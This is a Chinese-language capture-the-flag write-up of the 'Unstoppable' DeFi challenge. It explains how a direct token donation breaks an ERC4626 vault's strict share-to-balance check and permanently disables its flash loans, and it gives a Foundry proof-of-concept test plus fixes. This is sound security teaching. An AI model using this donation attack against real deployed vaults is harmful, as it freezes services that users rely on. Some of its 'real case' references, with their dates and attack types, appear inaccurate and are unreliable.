# Unstoppable 漏洞分析

## 1. 合约功能概述

`UnstoppableVault` 是一个符合 ERC4626 标准的代币金库，提供免费闪电贷功能（在宽限期内）。

**核心组件：**
- **UnstoppableVault.sol**: 主金库合约，继承 ERC4626 和 IERC3156FlashLender
- **UnstoppableMonitor.sol**: 监控合约，定期检查闪电贷功能是否正常

**业务流程：**
1. 用户通过 `deposit()` 存入 DVT 代币，获得金库份额（shares）
2. 任何人可以调用 `flashLoan()` 获取免费闪电贷（宽限期内）
3. 监控合约定期调用 `checkFlashLoan()` 确保服务可用性

---

## 2. 漏洞位置

### 漏洞代码（UnstoppableVault.sol#L78-L86）

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (amount == 0) revert InvalidAmount(0);
    if (address(asset) != _token) revert UnsupportedCurrency();
    uint256 balanceBefore = totalAssets();
    // ⚠️ 漏洞核心：严格相等检查
    if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
    
    // ... 闪电贷逻辑
}
```

### 关键依赖代码

```solidity
// totalAssets 直接读取合约余额
function totalAssets() public view override nonReadReentrant returns (uint256) {
    return asset.balanceOf(address(this));
}

// convertToShares 的计算（来自 Solmate ERC4626）
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply;
    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}
```

---

## 3. 漏洞原理分析

### 3.1 不变量假设的脆弱性

合约在 `flashLoan()` 前检查：
```
convertToShares(totalSupply) == totalAssets()
```

**该等式的隐含假设：**
- `totalAssets()` = 合约真实代币余额
- `totalSupply` = 已铸造的金库份额总量
- 假设: `totalAssets() == totalSupply` （初始 1:1 兑换率）

### 3.2 攻击向量

**正常流程：**
```
用户 deposit 1000 DVT → mint 1000 shares
totalSupply = 1000
totalAssets = 1000
convertToShares(1000) = floor(1000 * 1000 / 1000) = 1000 ✅
```

**攻击流程：**
```
攻击者直接 transfer 10 DVT 到 vault
totalSupply = 1000 (不变，因为没有调用 deposit)
totalAssets = 1010 (余额增加了)
convertToShares(1000) = floor(1000 * 1000 / 1010) = 990 ❌

990 != 1010，触发 InvalidBalance revert
```

### 3.3 为什么会有这个漏洞

**根本原因：**
1. **混合真实余额与会计余额**: `totalAssets()` 读取不可控的外部状态 `balanceOf()`
2. **不必要的严格检查**: 该等式不是闪电贷安全性的必要条件
3. **ERC4626 的设计特性**: 份额和资产的比例可以因捐赠、费用等原因偏移

**为什么检查不合理：**
- 闪电贷的安全性由 **借前余额 vs 借后余额** 保证，而非份额比例
- 任何人都可以直接转账到合约地址（无需权限）
- ERC4626 标准允许 `totalAssets` 和 `totalSupply` 有不同的兑换率

---

## 4. 修复方案

### 方案一：删除不必要的检查（推荐）

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (amount == 0) revert InvalidAmount(0);
    if (address(asset) != _token) revert UnsupportedCurrency();
    uint256 balanceBefore = totalAssets();
    // ❌ 删除这行
    // if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();

    ERC20(_token).safeTransfer(address(receiver), amount);
    
    uint256 fee = flashFee(_token, amount);
    if (
        receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
            != keccak256("IERC3156FlashBorrower.onFlashLoan")
    ) {
        revert CallbackFailed();
    }

    ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
    ERC20(_token).safeTransfer(feeRecipient, fee);

    return true;
}
```

**为什么有效：**
- 闪电贷安全性由后续的 `safeTransferFrom` 保证（还款不足会回滚）
- 移除攻击面：捐赠代币不再影响服务可用性
- 符合 ERC4626 设计：允许资产/份额比例浮动

### 方案二：使用内部会计变量

```solidity
uint256 private _internalAssets;

function totalAssets() public view override returns (uint256) {
    return _internalAssets; // 而非 asset.balanceOf(address(this))
}

function afterDeposit(uint256 assets, uint256 shares) internal override {
    _internalAssets += assets;
}

function beforeWithdraw(uint256 assets, uint256 shares) internal override {
    _internalAssets -= assets;
}
```

**权衡：**
- ✅ 保护不变量不被外部捐赠破坏
- ❌ 增加复杂度，gas 成本更高
- ❌ 需要处理所有可能的资产变动路径

---

## 5. Proof of Concept

### 攻击代码

```solidity
// test/unstoppable/Unstoppable.t.sol
function test_unstoppable() public checkSolvedByPlayer {
    // 方法1：直接转账（绕过 deposit）
    token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
    
    // 方法2：同样效果，先 approve 再 transfer
    // token.approve(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
    // token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
}
```

### 验证步骤

1. **初始状态检查：**
```solidity
assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
// convertToShares(totalSupply) == totalAssets ✅
```

2. **执行攻击：**
```solidity
vm.startPrank(player);
token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
vm.stopPrank();
```

3. **状态变化：**
```solidity
assertEq(vault.totalAssets(), TOKENS_IN_VAULT + INITIAL_PLAYER_TOKEN_BALANCE);
assertEq(vault.totalSupply(), TOKENS_IN_VAULT); // 不变
// convertToShares(totalSupply) < totalAssets ❌
```

4. **触发 DoS：**
```solidity
vm.prank(deployer);
vm.expectEmit();
emit UnstoppableMonitor.FlashLoanStatus(false);
monitorContract.checkFlashLoan(100e18); // 失败并暂停金库
```

### 完整攻击流程图

```
Player (10 DVT)
    │
    ├─ token.transfer(vault, 10 DVT)
    │
Vault 状态变化:
    │  totalAssets: 1,000,000 → 1,000,010
    │  totalSupply: 1,000,000 → 1,000,000 (不变)
    │
Monitor.checkFlashLoan(100e18)
    │
    ├─ vault.flashLoan(...)
    │     └─ convertToShares(1,000,000) = 999,990
    │     └─ 999,990 != 1,000,010
    │     └─ revert InvalidBalance ❌
    │
    └─ catch → vault.setPause(true) ✅ DoS 成功
```

---

## 6. 关键要点总结

| 维度 | 说明 |
|------|------|
| **攻击成本** | 仅需 1 wei 代币，无需特权 |
| **攻击影响** | 完全 DoS，闪电贷功能永久不可用（除非 owner 修复）|
| **根本原因** | 将不可控的外部状态作为安全检查的依据 |
| **修复难度** | 极低，删除一行代码即可 |
| **安全启示** | 不要在关键路径上断言"可被无权限操作破坏的条件" |

---

## 7. 扩展思考

### 类似漏洞模式

1. **Donation Attack**: 通过直接转账破坏依赖 `balanceOf()` 的逻辑
2. **Flash Mint Attack**: 利用份额铸造前后的状态不一致
3. **Rounding Error Exploitation**: 利用 ERC4626 的向下取整特性

### 防御最佳实践

```solidity
✅ DO: 使用内部状态变量记账
✅ DO: 在不变量检查前先快照状态
✅ DO: 使用 >= 而非 == 做余额检查
❌ DON'T: 假设 balanceOf() 只能通过特定函数改变
❌ DON'T: 在公开函数中做脆弱的严格相等断言
```

### 真实案例参考

- **Hundred Finance (2022)**: ERC4626 份额操纵导致 700 万美元损失
- **bZx (2020)**: 闪电贷重入攻击
- **Euler Finance (2023)**: Donation attack 导致 1.97 亿美元被盗

---

## 附录：完整测试代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";

contract UnstoppableExploit is Test {
    DamnValuableToken token;
    UnstoppableVault vault;
    UnstoppableMonitor monitor;
    
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    
    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant PLAYER_INITIAL = 10e18;

    function setUp() public {
        vm.startPrank(deployer);
        
        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, deployer, deployer);
        
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);
        
        token.transfer(player, PLAYER_INITIAL);
        
        monitor = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitor));
        
        vm.stopPrank();
    }

    function testExploit() public {
        // 验证初始状态正常
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        
        // 攻击：直接转账破坏不变量
        vm.prank(player);
        token.transfer(address(vault), PLAYER_INITIAL);
        
        // 验证闪电贷被 DoS
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitor.checkFlashLoan(100e18);
        
        assertTrue(vault.paused());
        assertEq(vault.owner(), deployer);
        
        console.log("[+] Exploit successful!");
        console.log("    Total Assets:", vault.totalAssets());
        console.log("    Total Supply:", vault.totalSupply());
        console.log("    Vault Paused:", vault.paused());
    }
}
```

**运行测试：**
```bash
forge test --match-test testExploit -vvv
```
